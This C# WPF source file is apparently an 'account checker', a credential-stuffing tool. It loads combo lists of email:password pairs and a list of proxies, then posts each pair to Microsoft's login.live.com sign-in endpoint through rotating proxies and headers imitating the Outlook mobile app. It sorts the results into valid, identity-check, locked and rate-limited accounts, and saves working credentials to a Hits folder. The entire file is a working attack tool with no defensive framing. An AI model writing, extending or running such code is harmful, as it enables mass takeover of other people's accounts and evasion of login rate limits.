using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using Microsoft.Win32;
using System.Windows;
using AccountCheckerWPF.Enums;
using AccountCheckerWPF.Managers;
using AccountCheckerWPF.Models;

namespace AccountCheckerWPF
{
    public partial class MainWindow : Window
    {
        static BlockingCollection<string> AccCh = new BlockingCollection<string>();
        static SemaphoreSlim semaphore;
        static int botCount = 1;
        static ConcurrentBag<Proxy> Proxies = new ConcurrentBag<Proxy>();
        static int globalindex = 0;
        static int retries = 0;
        static int fails = 0;
        static int hits = 0;
        static int locked = 0;
        static int indent = 0;
        private ProxyManager _proxyManager = new ProxyManager();
        private ComboManager _comboManager = new ComboManager();

        public MainWindow()
        {
            InitializeComponent();
            LoadProxyTypes();
        }

        private void LoadProxyTypes()
        {
            ProxyTypeComboBox.ItemsSource = Enum.GetValues(typeof(ProxyTypeEnums));
        }

        private void SelectAccountFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var accountFileName = openFileDialog.FileName;
                SelectAccountFileTxt.Text = accountFileName;
            }
        }

        private void SelectProxyFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var proxyFileName = openFileDialog.FileName;
                SelectProxyFileTxt.Text = proxyFileName;
            }
        }

        private async void CheckAccountBtn_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(SelectProxyFileTxt.Text))
            {
                MessageBox.Show("Please select a proxy file first.");
                return;
            }

            if (string.IsNullOrWhiteSpace(SelectAccountFileTxt.Text))
            {
                MessageBox.Show("Please select an account file first.");
                return;
            }

            if (ProxyTypeComboBox.SelectedItem == null)
            {
                MessageBox.Show("No Proxy Type selected.");
                return;
            }

            int proxyCount;
            var selectedProxyType = (ProxyTypeEnums)ProxyTypeComboBox.SelectedItem;
            try
            {
                proxyCount = _proxyManager.LoadProxiesFromFile(SelectProxyFileTxt.Text, selectedProxyType);
                Console.WriteLine($"Loaded {proxyCount} proxies");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Please ensure proxy file exists!");
                return;
            }

            int comboCount;
            try
            {
                comboCount = _comboManager.LoadFromFile(SelectAccountFileTxt.Text);
                Console.WriteLine($"Loaded {comboCount} combos");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Please ensure combo file exists!");
                return;
            }

            string hitsDirectory = "./Hits";
            if (!Directory.Exists(hitsDirectory))
            {
                Directory.CreateDirectory(hitsDirectory);
                Console.WriteLine("Hits directory created.");
            }
            else
            {
                Console.WriteLine("Hits directory loaded.");
            }

            var hitFilePath = Path.Combine(hitsDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");
            using (StreamWriter hitFileWriter = new StreamWriter(hitFilePath, false))
            {
                semaphore = new SemaphoreSlim(botCount, botCount);

                var tasks = new List<Task>();
                for (var i = 0; i < botCount; i++)
                {
                    tasks.Add(Task.Run(WorkerFunc));
                }

                foreach (var combo in _comboManager.ComboList)
                {
                    AccCh.Add(combo);
                }

                AccCh.CompleteAdding();

                await Task.WhenAll(tasks);

                Console.WriteLine("Done checking!");
            }
        }

        public async Task WorkerFunc()
        {
            try
            {
                await Task.Run(async () =>
                {
                    while (AccCh.TryTake(out string account))
                    {
                        if (string.IsNullOrEmpty(account) || !account.Contains(":"))
                        {
                            continue;
                        }

                        Retry:
                        var proxy = _proxyManager.GetRandomProxy();
                        if (proxy == null)
                        {
                            goto Retry;
                        }

                        var cookieContainer = new CookieContainer();
                        var httpClientHandler = _proxyManager.GetRandomProxyTransport(out proxy);
                        httpClientHandler.CookieContainer = cookieContainer;

                        using (var client = new HttpClient(httpClientHandler))
                        {
                            client.Timeout = TimeSpan.FromSeconds(10);
                            var email = account.Split(':')[0];
                            var password = account.Split(':')[1];

                            try
                            {
                                var getRequest = new HttpRequestMessage(HttpMethod.Get, "https://login.live.com/");
                                getRequest.Headers.Add("User-Agent",
                                    "Mozilla/5.0 (Linux; Android 9; SM-G9880 Build/PQ3A.190705.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Safari/537.36");
                                getRequest.Headers.Add("Accept", "*/*");
                                getRequest.Headers.Add("Accept-Language", "en-US,en;q=0.8");

                                var getResponse = await client.SendAsync(getRequest);
                                var bodyGet = await getResponse.Content.ReadAsStringAsync();

                                var bk = ExtractValue(bodyGet, "bk=", "&");
                                var contextid = ExtractValue(bodyGet, "contextid=", "&");
                                var uaid = ExtractValue(bodyGet, "uaid=", "\"/>");
                                var ppft = ExtractValue(bodyGet, "name=\"PPFT\" id=\"i0327\" value=\"", "\"");

                                var contentPost =
                                    $"i13=1&login={WebUtility.UrlEncode(email)}&loginfmt={WebUtility.UrlEncode(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={WebUtility.UrlEncode(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=41679";
                                var contentBytes = new StringContent(contentPost, Encoding.UTF8,
                                    "application/x-www-form-urlencoded");

                                var postRequest = new HttpRequestMessage(HttpMethod.Post,
                                    $"https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username={WebUtility.UrlEncode(email)}&contextid={contextid}&bk={bk}&uaid={uaid}&pid=15216")
                                {
                                    Content = contentBytes
                                };

                                postRequest.Headers.Host = "login.live.com";
                                postRequest.Headers.Connection.ParseAdd("keep-alive");
                                postRequest.Headers.CacheControl = new CacheControlHeaderValue
                                {
                                    MaxAge = TimeSpan.Zero
                                };
                                postRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                postRequest.Headers.Referrer = new Uri("https://login.live.com");
                                postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("text/html"));
                                postRequest.Headers.Accept.Add(
                                    new MediaTypeWithQualityHeaderValue("application/xhtml+xml"));
                                postRequest.Headers.Accept.Add(
                                    new MediaTypeWithQualityHeaderValue("application/xml", 0.9));
                                postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/avif", 0.8));
                                postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/webp", 0.8));
                                postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("image/apng", 0.8));
                                postRequest.Headers.Accept.Add(new MediaTypeWithQualityHeaderValue("*/*", 0.8));
                                postRequest.Headers.Accept.Add(
                                    new MediaTypeWithQualityHeaderValue("application/signed-exchange", 0.9));
                                postRequest.Headers.Add("X-Requested-With", "com.microsoft.office.outlook");
                                postRequest.Headers.Add("Sec-Fetch-Site", "same-origin");
                                postRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                postRequest.Headers.Add("Sec-Fetch-User", "?1");
                                postRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                postRequest.Headers.AcceptEncoding.ParseAdd("gzip");
                                postRequest.Headers.AcceptEncoding.ParseAdd("deflate");
                                postRequest.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en-US"));
                                postRequest.Headers.AcceptLanguage.Add(new StringWithQualityHeaderValue("en", 0.9));

                                var postResponse = await client.SendAsync(postRequest);
                                var body = await postResponse.Content.ReadAsStringAsync();

                                var cookies = postResponse.Headers.GetValues("Set-Cookie").ToList();

                                if (cookies.Any(c => c.Contains("WLSSC")) || cookies.Any(c => c.Contains("ANON")) ||
                                    body.Contains("SigninName") ||
                                    body.Contains("https://login.live.com/oauth20_desktop.srf?"))
                                {
                                    Console.WriteLine($"[ ✔️ ] Valid Account: {account}");
                                    hits++;
                                    goto Complete;
                                }
                                else if (body.Contains("sign in too many times") || body.Contains("Too Many Requests"))
                                {
                                    retries++;
                                    goto Retry;
                                }
                                else if (body.Contains("identity/confirm") || body.Contains("Email/Confirm"))
                                {
                                    indent++;
                                    Directory.CreateDirectory("Hits");
                                    await File.AppendAllTextAsync("Hits/identity.txt", $"{email}:{password}\n");
                                    Console.WriteLine($"[Identity] Account: {account}");
                                    goto Complete;
                                }
                                else if (body.Contains("https://account.live.com/recover") ||
                                         body.Contains("https://account.live.com/Abuse"))
                                {
                                    locked++;
                                    goto Complete;
                                }
                                else
                                {
                                    fails++;
                                }
                            }
                            catch
                            {
                                retries++;
                                goto Retry;
                            }
                        }

                        Complete:
                        globalindex++;
                    }
                });
            }
            finally
            {
                semaphore.Release();
            }
        }

        private string ExtractValue(string source, string start, string end)
        {
            var startIndex = source.IndexOf(start, StringComparison.Ordinal);
            if (startIndex == -1) return string.Empty;
            startIndex += start.Length;
            var endIndex = source.IndexOf(end, startIndex, StringComparison.Ordinal);
            if (endIndex == -1) return string.Empty;
            return source.Substring(startIndex, endIndex - startIndex);
        }
    }
}